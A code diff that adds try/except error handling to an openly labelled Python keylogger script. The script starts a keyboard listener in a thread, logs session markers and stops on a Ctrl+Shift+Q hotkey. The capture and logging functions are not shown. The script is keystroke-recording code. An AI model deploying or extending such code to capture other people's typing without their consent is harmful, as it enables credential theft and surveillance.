@@ -32,23 +32,39 @@ def start_keylogger():
     write_log("\n[SESSION START]")
     print("[INFO] Keylogger started. Press Ctrl + Shift + Q to stop.")
 
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+    try:
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
+    except Exception as e:
+        print(f"[ERROR] Failed to start keylogger: {e}")
+        write_log(f"[ERROR] Failed to start keylogger: {e}")
 
 def stop_keylogger():
     global listener
     write_log("[SESSION END]")
     print("[INFO] Hotkey pressed. Stopping keylogger.")
     if listener:
-        listener.stop()
+        try:
+            listener.stop()
+        except Exception as e:
+            print(f"[ERROR] Could not stop listener: {e}")
+            write_log(f"[ERROR] Could not stop listener: {e}")
 
 def monitor_hotkey():
-    with keyboard.GlobalHotKeys({
-        '<ctrl>+<shift>+q': stop_keylogger
-    }) as h:
-        h.join()
+    try:
+        with keyboard.GlobalHotKeys({
+            '<ctrl>+<shift>+q': stop_keylogger
+        }) as h:
+            h.join()
+    except Exception as e:
+        print(f"[ERROR] Failed to register hotkey: {e}")
+        write_log(f"[ERROR] Failed to register hotkey: {e}")
 
 if __name__ == "__main__":
     # Start keylogger and hotkey monitor in separate threads
-    threading.Thread(target=start_keylogger, daemon=True).start()
-    monitor_hotkey()
+    try:
+        threading.Thread(target=start_keylogger, daemon=True).start()
+        monitor_hotkey()
+    except Exception as e:
+        print(f"[ERROR] Unexpected error in main thread: {e}")
+        write_log(f"[ERROR] Unexpected error in main thread: {e}")
